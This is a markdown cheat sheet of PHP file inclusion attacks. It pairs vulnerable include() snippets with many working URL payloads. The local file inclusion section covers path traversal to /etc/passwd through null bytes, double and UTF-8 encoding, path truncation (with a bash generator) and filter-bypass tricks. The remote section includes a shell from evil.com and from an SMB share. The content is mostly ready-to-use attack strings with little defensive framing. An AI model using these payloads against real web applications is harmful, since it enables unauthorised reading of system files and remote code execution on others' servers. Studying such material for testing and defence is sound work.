## Local File Inclusion
### Filename Prefix
If the following code is used to handle parameters:
```php
include("lang_" . $_GET['language']);
```
Then, if we try to traverse the directory with `../../../etc/passwd`, the final string would be `lang_../../../etc/passwd`, which is invalid.
so, instead of directly using path traversal, we can prefix a `/` before our payload, and this should consider the prefix as a directory.
```txt
http://example.com/index.php?language=/../../../../etc/passwd
```
### Approved Paths
Some web applications may also use Regular Expressions to ensure that the file being included is under a specific path. For example, the web application we have been dealing with may only accept paths that are under the `./languages` directory, as follows:
```php
if(preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {
    include($_GET['language']);
} else {
    echo 'Illegal path specified!';
}
```
To bypass this, we may use path traversal and start our payload with the approved path, and then use `../` to go back to the root directory and read the file we specify, as follows:
```txt
http://example.com/index.php?language=./languages/../../../../etc/passwd
```
### Null byte
```txt
http://example.com/index.php?page=../../../etc/passwd%00
```
> Note: Only PHP versions before 5.5 were vulnerable to Null Byte bypass.
### Double encoding
```txt
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
```
```txt
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### UTF-8 encoding
```txt
http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
```
```txt
http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00
```
### Path and dot truncation
On most PHP installations a filename longer than `4096` bytes will be cut off so any excess characters will be thrown away. it is also important to note that we would also need to start the path with a non-existing directory for this technique to work.
```txt
http://example.com/index.php?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]
```

Additionally, we can automate this using the following script:
```bash
echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
non_existing_directory/../../../etc/passwd/./././<SNIP>././././
```

> Note: Only PHP versions before 5.5 were vulnerable to Null Byte bypass.
### Filter bypass tricks
```txt
http://example.com/index.php?page=....//....//etc/passwd
```
```txt
http://example.com/index.php?page=..///////..////..//////etc/passwd
```
```txt
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
```
### Using Base64
[One LFI bypass to rule them all (using base64)](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/)
## Remote File Inclusion
### Null byte
```txt
http://example.com/index.php?page=http://evil.com/shell.txt%00
```
### Double encoding
```txt
http://example.com/index.php?page=http:%252f%252fevil.com%252fshell.txt
```
### Bypass `allow_url_include`
When `allow_url_include` and `allow_url_fopen` are set to `Off`. It is still possible to include a remote file on Windows target using the `smb` protocol.
1. Create a share open to everyone
2. Write a PHP code inside a file: `shell.php`
3. Include it `http://example.com/index.php?page=\\10.0.0.1\share\shell.php`